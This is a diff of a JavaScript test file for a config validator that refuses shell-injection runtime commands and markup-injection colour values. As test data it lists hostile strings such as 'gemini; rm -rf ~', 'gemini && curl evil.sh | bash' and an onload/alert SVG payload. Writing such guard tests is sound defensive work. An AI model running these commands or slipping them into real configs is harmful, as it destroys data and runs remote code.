@@ -1,29 +1,94 @@
 import test from 'node:test'
 import assert from 'node:assert/strict'
-import { validateConfig, validateRuntime, validatePersona } from '../src/validate.js'
+import { normalizeOllamaHost, validateConfig, validatePersona, validateRuntime } from '../src/validate.js'
 
-// These validators are the gate every machine-written config passes through —
-// the bootstrap's proposal and Pro's custom personas both land here. If this
-// file is green, "the model generated it" and "it was checked" are the same
-// statement. That is the whole point of routing generated config through one
-// door.
+const longPrompt = 'You are a specialist debater. '.repeat(8)
 
-/* ── runtimes: the security-critical one ─────────────────────────────────── */
+test('validateRuntime accepts a bare custom CLI and rejects shell-shaped commands', () => {
+  assert.deepEqual(validateRuntime({ id: 'gemini', label: 'Gemini', command: 'gemini' }), {
+    ok: true,
+    value: { id: 'gemini', label: 'Gemini', command: 'gemini', provider: 'gemini', kind: 'custom', modelFlag: null, promptFlag: null, workdirFlag: null, promptMode: 'stdin', modelDiscovery: 'none', approvalMode: null, capabilities: [], retryableExitCodes: [], roundtable: false },
+    errors: [],
+  })
 
-test('a plain runtime is accepted', () => {
-  const r = validateRuntime({ id: 'gemini', label: 'gemini', command: 'gemini' })
-  assert.equal(r.ok, true)
-  assert.equal(r.value.command, 'gemini')
+  const bad = validateRuntime({ id: 'evil', command: 'gemini --danger; rm -rf /' })
+  assert.equal(bad.ok, false)
+  assert.match(bad.errors.join('\n'), /no arguments or shell characters/)
+
+  const local = validateRuntime({ id: 'llama-cpp', label: 'llama.cpp', command: 'llama-cli', kind: 'local', roundtable: true, modelFlag: '--model', promptMode: 'stdin' })
+  assert.equal(local.ok, true)
+  assert.equal(local.value.kind, 'local')
+  assert.equal(local.value.roundtable, true)
+  assert.equal(local.value.modelFlag, '--model')
 })
 
-test('an absolute path command is accepted', () => {
-  assert.equal(validateRuntime({ id: 'internal', command: '/usr/local/bin/agent' }).ok, true)
+test('validateRuntime refuses ids that collide with shell built-ins', () => {
+  const result = validateRuntime({ id: 'shell', command: 'zsh' })
+  assert.equal(result.ok, false)
+  assert.match(result.errors.join('\n'), /conflicts with the built-in shell profile/)
 })
 
-// The command string is executed via `zsh -lic <cmd>`. Anything that could turn
-// one program name into a second command must be refused, or config.json is a
-// remote-code-execution vector wearing a settings file's clothes.
-test('shell metacharacters are refused in a runtime command', () => {
+test('validateConfig sanitizes optional roots, projects, runtimes and model names', () => {
+  const result = validateConfig({
+    roots: ['~/CLAUDE'],
+    projects: [{ id: 'Portal', label: 'Portal', path: '~/CLAUDE/williams-media-portal' }],
+    hidden: ['archive-room'],
+    runtimes: [{ id: 'gemini', label: 'Gemini', command: 'gemini' }],
+    models: ['sonnet', 'claude-sonnet-5', ''],
+  })
+
+  assert.equal(result.ok, true)
+  assert.deepEqual(result.value.roots, ['~/CLAUDE'])
+  assert.equal(result.value.projects[0].path, '~/CLAUDE/williams-media-portal')
+  assert.deepEqual(result.value.hidden, ['archive-room'])
+  assert.deepEqual(result.value.runtimes, [{ id: 'gemini', label: 'Gemini', command: 'gemini', provider: 'gemini', kind: 'custom', modelFlag: null, promptFlag: null, workdirFlag: null, promptMode: 'stdin', modelDiscovery: 'none', approvalMode: null, capabilities: [], retryableExitCodes: [], roundtable: false }])
+  assert.deepEqual(result.value.models, ['sonnet', 'claude-sonnet-5'])
+})
+
+test('Ollama host accepts a network endpoint without credentials or paths', () => {
+  assert.equal(normalizeOllamaHost('192.168.1.50:11434'), 'http://192.168.1.50:11434')
+  assert.equal(validateConfig({ ollamaHost: 'https://nas.example.test:11434' }).value.ollamaHost, 'https://nas.example.test:11434')
+  assert.equal(validateConfig({ ollamaHost: 'http://user:pass@nas.example.test:11434' }).ok, false)
+  assert.equal(validateConfig({ ollamaHost: 'http://nas.example.test/api' }).ok, false)
+})
+
+test('validatePersona rejects markup-injection palette values and short prompts', () => {
+  const result = validatePersona({
+    id: 'bad bot',
+    name: 'Bad',
+    prompt: 'too short',
+    palette: { body: 'url(javascript:alert(1))' },
+  })
+
+  assert.equal(result.ok, false)
+  assert.match(result.errors.join('\n'), /palette\.body must be a hex colour/)
+  assert.match(result.errors.join('\n'), /prompt must be at least 80 characters/)
+})
+
+test('validatePersona normalizes safe custom personas without leaking extra fields', () => {
+  const result = validatePersona({
+    id: 'Strategy Lead!',
+    name: 'Strategy Lead',
+    role: 'Planner',
+    tagline: 'Sharp operator',
+    prompt: longPrompt,
+    model: 'claude-sonnet-5',
+    palette: { body: '#123456', trim: '#abcdef', glow: '#fff' },
+    secret: 'do not copy',
+  })
+
+  assert.equal(result.ok, true)
+  assert.equal(result.value.id, 'strategylead')
+  assert.equal(result.value.edition, 'custom')
+  assert.equal(result.value.model, 'claude-sonnet-5')
+  assert.equal(result.value.secret, undefined)
+})
+
+// One example does not prove the guard. The command string is executed via
+// `zsh -lic <cmd>`, so every shape that could turn one program name into a
+// second command has to be refused — this is the line between "add your own
+// agent" and "config.json runs arbitrary shell".
+test('validateRuntime refuses every shell-injection shape, not just semicolons', () => {
   const attacks = [
     'gemini; rm -rf ~',
     'gemini && curl evil.sh | bash',
@@ -34,7 +99,7 @@ test('shell metacharacters are refused in a runtime command', () => {
     'gemini | tee x',
     'gemini &',
     'gemini\nrm -rf ~',
-    'gemini --flag',        // arguments are not allowed either
+    'gemini --flag',
     'echo "hi"',
     "sh -c 'x'",
     'gemini*',
@@ -42,70 +107,14 @@ test('shell metacharacters are refused in a runtime command', () => {
   ]
   for (const command of attacks) {
     const r = validateRuntime({ id: 'x', command })
-    assert.equal(r.ok, false, `should have refused: ${command}`)
+    assert.equal(r.ok, false, `should have refused: ${JSON.stringify(command)}`)
     assert.equal(r.value, null)
   }
 })
 
-test('a runtime cannot shadow the built-in shell profile', () => {
-  assert.equal(validateRuntime({ id: 'shell', command: 'bash' }).ok, false)
-  assert.equal(validateRuntime({ id: 'zsh', command: 'bash' }).ok, false)
-})
-
-test('a runtime needs a usable id and a command', () => {
-  assert.equal(validateRuntime({ command: 'x' }).ok, false)
-  assert.equal(validateRuntime({ id: 'ok' }).ok, false)
-  assert.equal(validateRuntime({ id: 'HAS SPACES', command: 'x' }).ok, false)
-  assert.equal(validateRuntime(null).ok, false)
-})
-
-test('a runtime without a label falls back to its id', () => {
-  assert.equal(validateRuntime({ id: 'aider', command: 'aider' }).value.label, 'aider')
-})
-
-/* ── config ──────────────────────────────────────────────────────────────── */
-
-test('a full valid config passes and is normalized', () => {
-  const { ok, value } = validateConfig({
-    roots: ['~/code'],
-    projects: [{ id: 'api', label: 'Billing API', path: '~/code/api' }],
-    hidden: ['scratch'],
-    runtimes: [{ id: 'gemini', command: 'gemini' }],
-    models: ['claude-opus-4-1'],
-  })
-  assert.equal(ok, true)
-  assert.equal(value.projects[0].label, 'Billing API')
-  assert.deepEqual(value.hidden, ['scratch'])
-  assert.equal(value.runtimes[0].id, 'gemini')
-  assert.deepEqual(value.models, ['claude-opus-4-1'])
-})
-
-test('a config that is not an object is refused with a reason', () => {
-  for (const bad of [null, undefined, 'string', 42, []]) {
-    const r = validateConfig(bad)
-    assert.equal(r.ok, false)
-    assert.ok(r.errors.length, 'a rejection must explain itself')
-  }
-})
-
-test('malformed sections are reported individually, not as one opaque failure', () => {
-  const r = validateConfig({ roots: 'not-an-array', projects: 'nope', hidden: 5 })
-  assert.equal(r.ok, false)
-  assert.equal(r.errors.length, 3)
-  assert.ok(r.errors.some(e => e.includes('roots')))
-  assert.ok(r.errors.some(e => e.includes('projects')))
-  assert.ok(r.errors.some(e => e.includes('hidden')))
-})
-
-test('a project without a path is rejected by index so the author can find it', () => {
-  const r = validateConfig({ projects: [{ id: 'ok', path: '/a' }, { id: 'bad' }] })
-  assert.equal(r.ok, false)
-  assert.ok(r.errors.some(e => e.includes('projects[1]')))
-})
-
-// A hostile runtime buried in an otherwise-fine generated config must sink the
-// config, not slip through beside the valid entries.
-test('one bad runtime invalidates the whole generated config', () => {
+// A hostile entry buried in an otherwise-fine generated config must sink the
+// whole config rather than slipping through beside the valid ones.
+test('one bad runtime invalidates a whole generated config', () => {
   const r = validateConfig({
     projects: [{ id: 'a', path: '/a' }],
     runtimes: [{ id: 'good', command: 'gemini' }, { id: 'evil', command: 'x; rm -rf ~' }],
@@ -114,46 +123,8 @@ test('one bad runtime invalidates the whole generated config', () => {
   assert.ok(r.errors.some(e => e.includes('runtimes[1]')))
 })
 
-test('an empty config is valid — everything is optional', () => {
-  assert.equal(validateConfig({}).ok, true)
-})
-
-/* ── personas ────────────────────────────────────────────────────────────── */
-
-test('a usable persona is accepted and defaulted', () => {
-  const { ok, value } = validatePersona({
-    id: 'compliance', name: 'Reg', role: 'Compliance',
-    palette: { body: '#123456' },
-    prompt: 'x'.repeat(120),
-  })
-  assert.equal(ok, true)
-  assert.equal(value.edition, 'custom')
-  assert.equal(value.palette.body, '#123456')
-  assert.ok(value.palette.trim, 'missing palette slots get defaults')
-  assert.equal(value.visor, 'dot')
-})
-
-// Palette values are interpolated straight into SVG attributes.
-test('a non-hex palette value is refused rather than reaching the SVG', () => {
-  const r = validatePersona({
-    id: 'x', prompt: 'y'.repeat(120),
-    palette: { body: '" onload="alert(1)' },
-  })
-  assert.equal(r.ok, false)
-  assert.ok(r.errors.some(e => e.includes('palette.body')))
-})
-
-test('a persona too short to argue is refused', () => {
-  const r = validatePersona({ id: 'x', prompt: 'be critical', palette: { body: '#fff' } })
-  assert.equal(r.ok, false)
-  assert.ok(r.errors.some(e => e.includes('80 characters')))
-})
-
-test('a persona id is normalized to a safe slug', () => {
-  const { value } = validatePersona({ id: 'My Agent!!', prompt: 'z'.repeat(120), palette: { body: '#fff' } })
-  assert.equal(value.id, 'myagent')
-})
-
+// Generated config arrives from a model; hostile or malformed input must
+// degrade to "rejected, with reasons", never throw into the cockpit.
 test('validators never throw on hostile input', () => {
   for (const bad of [null, undefined, 0, '', [], { palette: null }, { palette: { body: {} } }]) {
     assert.doesNotThrow(() => validatePersona(bad))
